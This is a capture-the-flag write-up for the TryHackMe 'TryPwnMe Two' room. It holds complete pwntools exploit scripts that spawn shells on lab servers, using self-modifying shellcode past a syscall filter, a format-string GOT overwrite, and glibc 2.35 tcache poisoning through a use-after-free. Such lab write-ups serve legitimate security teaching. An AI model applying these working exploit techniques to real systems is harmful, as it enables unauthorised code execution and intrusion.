# TryPwnMe Two

<https://tryhackme.com/room/trypwnmetwo>

A sequel to [TryPwnMe One](https://tryhackme.com/room/trypwnmeone) ([my writeup](./trypwnmeone.md))

## TryExecMe2

This is a shell code executor: it reads 100 chars from the input, runs them through a function called 'forbidden' which looks for any use of `\x0f \x05` (syscall) or `\x0f \x32` (sysenter) or `\xcd \x80` (int 80, old fashioned syscall) and, if none of these are found, will then run the code as if it was a function.

```c
undefined8 main(void)
{
  char cVar1;
  code *__buf;
  
  setup();
  banner();
  __buf = (code *)mmap((void *)0xcafe0000,100,7,0x22,-1,0);
  puts("\nGive me your spell, and I will execute it: ");
  read(0,__buf,0x80);
  puts("\nExecuting Spell...\n");
  cVar1 = forbidden(__buf);
  if (cVar1 != '\0') {
    exit(1);
  }
  (*__buf)();
  return 0;
}

undefined8 forbidden(long param_1)
{
  ulong local_18;
  
  local_18 = 0;
  while( true ) {
    if (0x7e < local_18) {
      return 0;
    }
    if ((*(char *)(local_18 + param_1) == '\x0f') && (*(char *)(param_1 + local_18 + 1) == '\x05'))
    {
      puts("Forbidden spell detected!");
      return 1;
    }
    if ((*(char *)(local_18 + param_1) == '\x0f') && (*(char *)(param_1 + local_18 + 1) == '4')) {
      puts("Forbidden spell detected!");
      return 1;
    }
    if ((*(char *)(local_18 + param_1) == -0x33) && (*(char *)(param_1 + local_18 + 1) == -0x80))
    break;
    local_18 = local_18 + 1;
  }
  puts("Forbidden spell detected!");
  return 1;
}
```

So what can you do with a < 100 byte shellcode, where you can't use any syscalls (at least directly)?

The solution is to use some self-modifying shellcode:

1. we execute /bin/sh via execve as normal. This is setting up some stack variables and then invoking syscall (`\x05\x0f`)
2. instead of the syscall opcodes though, we put two nops `\x90\x90`
3. and at the beginning, before we set up args, we find the syscall address and replace it with the right codes
4. the right codes are stored xor'ed, and are un-xor'd before writing

the below pwntools code does all of this and spawns a shell:

```python
from pwn import *

context.arch = 'amd64'
shellcode = asm('''
    lea rsi, [rip + syscall_location]
    mov ax, 0x7316
    xor ax, 0x7619 /* 0x7316 ^ 0x7619 = 0x050f */
    mov [rsi], ax
    
    /* execve setup */
    xor rdx, rdx
    push rdx
    mov rax, 0x68732f2f6e69622f /* /bin/sh */
    push rax
    mov rdi, rsp
    push rdx
    push rdi
    mov rsi, rsp
    mov rax, 59
    
syscall_location:
    nop
    nop
''')

# p = process('./TryExecMe2/tryexecme2')
p = remote('10.10.49.142', 5002)

p.clean()
p.sendline(shellcode)
p.interactive()
```

## NotSpecified2

This is a format string vulnerability:

```c
void main(void)
{
  long in_FS_OFFSET;
  char local_218 [520];
  undefined8 local_10;
  
  local_10 = *(undefined8 *)(in_FS_OFFSET + 0x28);
  setup();
  banner();
  puts("Please provide your username:");
  read(0,local_218,0x200);
  printf("Thanks ");
  printf(local_218);
  exit(0x539);
  return;
}
```

Fairly standard. The binary has all protections but is not PIE, and the libc it uses is also provided. By testing with "AAAAAAAA %6$p" we find the offset to the buffer is 6. The goal will be to overwrite the got entry for exit with something, likely system. However, we need a libc leak (as libc itself is PIE) to find the address of system... as the program only reads and writes once, we will need to loop main.

The steps will be:

1. Use format string bug to overwrite exit to main's address, causing main to loop
2. On second loop, leak a libc address, so we can calculate where libc is (its PIE)
3. On the third loop, overwrite printf with system.

the below code will do this (WIP):

```python
from pwn import *

elf = context.binary = ELF("./NotSpecified2/notspecified2")
libc = ELF("./NotSpecified2/libc.so.6")
ld = ELF("./NotSpecified2/ld-linux-x86-64.so.2")

# p = process([ld.path, elf.path], env={"LD_PRELOAD": libc.path})
p = remote('10.10.223.43', 5000)
p.recvuntil(b"Please provide your username:\x0a")

# offset found with p.sendline(b'AAAAAAAA %6$p')
offset = 6

# make main loop by changing the final exit to the start of main
payload = fmtstr_payload(6, {elf.got.exit : elf.sym.main})
p.sendline(payload)

p.recvuntil(b"Please provide your username:\x0a")

# on second loop leak printf address to calculate libc base
payload = b"%7$s||||" + p64(elf.got.puts)
p.sendline(payload)

result = p.recvuntil(b"Please provide your username:\x0a")

puts_address = u64(result[7:13].ljust(8, b'\x00'))
libc.address = puts_address - libc.sym.puts

# set printf to system on third loop
payload = fmtstr_payload(6, {elf.got.printf : libc.sym.system})
p.sendline(payload)

p.recvuntil(b"Please provide your username:\x0a")

# any input provided for your 'username' will be passed to system for execution - something of a restricted shell
p.interactive()
```

At this point main is still looping and asking for a username, but whatever is submitted will be executed with system. This includes the prior `Thanks ` text, so the output will include `sh: 1: Thanks: not found`. Using `ls` and `cat` on subsequent loops can read the flag.

## TryaNote

This is a heap challenge; the application accepts one of five commands: create, show, update and delete, which all manipulate heap memory, and 'win', which will pass an argument to one of the previously created memory regions, treating that region as a function. The goal is to therefore create a memory region that maps to system, and then pass it the memory address (as it takes unsigned longs, `%lu`) as an argument.

```c
void win(void)
{
  uint index;
  undefined8 param_1;
  code *func;
  long local_10;
  
  puts("Enter the index:");
  index = read_opt();
  if ((index < 0x20) && (*(long *)(chunks + (ulong)index * 8) != 0)) {
    puts("Enter the data:");
    __isoc99_scanf(&fmt,&param_1); // fmt = %lu
    func = (code *)**(undefined8 **)(chunks + (ulong)index * 8);
    (*func)(param_1);
  }
  else {
    puts("Invalid index.");
  }
  return;
}
```

Only 32 locations can be 'created', each with a max size of 4096 (0x1000). Notably, delete will call `free` on a location, but otherwise show and update etc will continue to work - its a basic use-after-free vulnerable solution. Otherwise there are no buffer overflow locations or similar. The glibc used is provided, and tagged as specifically **2.35** which is not the latest and has [some heap exploit opportunities.](https://github.com/shellphish/how2heap/blob/master/glibc_2.35)

The path will be using an unsorted bin attack to get libc and a heap address. The heap address will allow tcache poisoning (which allows us to force malloc to target chosen addresses), and via that we can get an address of the stack from libc, an address of the program from the stack, then finally the address of the chunks array as an offset from the program base. Via the chunks array we can place the address of system and call it with the address of `/bin/sh`. The below, long-esh script does this:

```python
from pwn import *

elf = context.binary = ELF("./tryanote")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

# p = process(elf.path, env={"LD_PRELOAD": libc.path})
p = remote('10.10.253.209', 5001)

def create(size, data):
    try:
        size = str(size).encode("ascii")
        p.sendline(b"1")
        p.recvuntil(b"Enter entry size:\n")
        p.sendline(size)
        p.recvuntil(b"Enter entry data:\n")
        p.sendline(data)
        p.recvuntil(b"Entry created at index ")
        index = p.recvline()
        p.recvuntil(b">>")
        return int(index.strip())
    except:
        print(p.clean())
        exit()

def read(index):
    index = str(index).encode("ascii")
    p.sendline(b"2")
    p.recvuntil(b"Enter entry index:\n")
    p.sendline(index)
    result = p.recvuntil(b"[1]")
    result = result[:-4]
    p.recvuntil(b">>")
    return result.strip()

def update(index, data):
    try:
        index = str(index).encode("ascii")
        p.sendline(b"3")
        p.recvuntil(b"Enter entry index:\n")
        p.sendline(index)
        p.recvuntil(b"Enter data:\n")
        p.sendline(data)
        p.recvuntil(b">>")
    except:
        print(p.clean())
        exit()

def delete(index):
    index = str(index).encode("ascii")
    p.sendline(b"4")
    p.recvuntil(b"Enter entry index:\n")
    p.sendline(index)
    p.recvuntil(b">>")

p.recvuntil(b">>")

# first create a large chunk (too big for any bin but unsorted when freed)
# then create a small chunk after, so when the large chunk is freed it must go into a bin (rather than return to the unallocated space)
# the unsorted bin placement will put both a libc and a stack address into the chunk, which we can then read and leak

create(2000, b"") # index 0
create(8, b"") # index 1
delete(0) # delete the large bin, sending it to unsorted. a libc address will be put inside (the unsorted bin head pointer)

create(32, b"AAAAAAA") # index 2
libc_leak = u64(read(2)[8:].ljust(8, b'\x00'))
libc_offset = 0x21A1C0 # subtract address in gdb from libc base as shown by vmmap command
libc.address = libc_leak - libc_offset
print("libc base:", hex(libc.address))

update(2, b"AAAAAAAABBBBBBB")
heap_leak = u64(read(2)[16:].ljust(8, b'\x00'))
heap_offset = 0x290 # subtract address in gdb from heap base as shown by vmmap command
heap_base = heap_leak - heap_offset
print("heap base:", hex(heap_base))

# goal is now to get a chunk to be allocated at the location of the chunks list
# we need to: find the stack via libc, find the program via the stack, calculate chunks offset
# load system into a chunks address, run win() with the address of /bin/sh

# with a heap address we can achieve tcache poisoning, allowing us to allocate at arbitrary locations
# the heap addr is used to cipher the target. we must also ensure its stack aligned (% 16 = 0)
# https://github.com/shellphish/how2heap/blob/master/glibc_2.35/tcache_poisoning.c

# first leak a stack adress stored in libc

create(128, b"") # index 3
create(128, b"") # index 4
delete(3)
delete(4)

# tcache is now 4 <- 3 (chunk 4 linked to chunk 3)
index_4_addr = heap_base + 0x360 # again checked via 'heap bins' and vmmap in gdb
target = libc.symbols["__libc_argv"] - 0x10 # location in libc that holds a reference to the stack
target_cipher = target ^ (index_4_addr >> 12)

# we overwrite the link from index 4 to index 3 with a target address
update(4, target_cipher.to_bytes(8, "little"))

create(128, b"") # index 5. uses index 4 space. next allocation will be at target
create(128, b"AAAAAAAABBBBBBB") # index 6. should be at target
stack_leak = u64(read(6)[16:].ljust(8, b'\x00'))
print("stack leak:", hex(stack_leak))

# next leak a binary address from the stack

create(128, b"") # index 7
create(128, b"") # index 8
delete(7)
delete(8)

index_8_addr = heap_base + 0x480
target = stack_leak - 0x30
offset = target % 16
target = target // 16 * 16
print("aligned target:", hex(target))
target_cipher = target ^ (index_8_addr >> 12)

update(8, target_cipher.to_bytes(8, "little"))

create(128, b"") # index 9. uses index 8 space. next allocation will be at target
create(128, b"X" * offset + b"AAAAAAAABBBBBBB") # index 10. should be at target
bin_leak = u64(read(10)[offset+16:].ljust(8, b'\x00'))
bin_base = bin_leak - 0x1165
print("bin base:", hex(bin_base))

# penultimately, gain control of the 'chunks' array used by the program and insert libc.sym.system

create(128, b"") # index 11
create(128, b"") # index 12
delete(11)
delete(12)

chunks_base = bin_base + 0x4060
print("chunks base:", hex(chunks_base))
target = chunks_base
offset = target % 16
target = target // 16 * 16
print("aligned target:", hex(target))
target_cipher = target ^ (index_8_addr >> 12)

update(12, target_cipher.to_bytes(8, "little"))

create(128, b"") # index 13. uses index 12 space. next allocation will be at chunks array

# the win function will read the address at an index, and call the address STORED in that address.
# so we set index 0 to store the location of index 1, and put the address of system in index 1
new_chunks = (chunks_base + 0x8).to_bytes(8, "little") + libc.sym.system.to_bytes(8, "little")
create(128, b"X" * offset + new_chunks) # index 14. should be at chunks array. making chunk 0 point at chunk 1 which points at system

# finally, call win with chunk 0 as the index and the location of /bin/sh as the data

binsh_addr = next(libc.search(b'/bin/sh'))
binsh_addr = u64(p64(binsh_addr), signed=False)

p.sendline(b"5")
p.recvuntil(b"Enter the index:\n")
p.sendline(b"0")
p.recvuntil(b"Enter the data:\n")
p.sendline(str(binsh_addr).encode())

p.interactive()
```

Similar techniques (though harder given no free was available) were used in the advent of cyber 2024 side quest 3 challenge.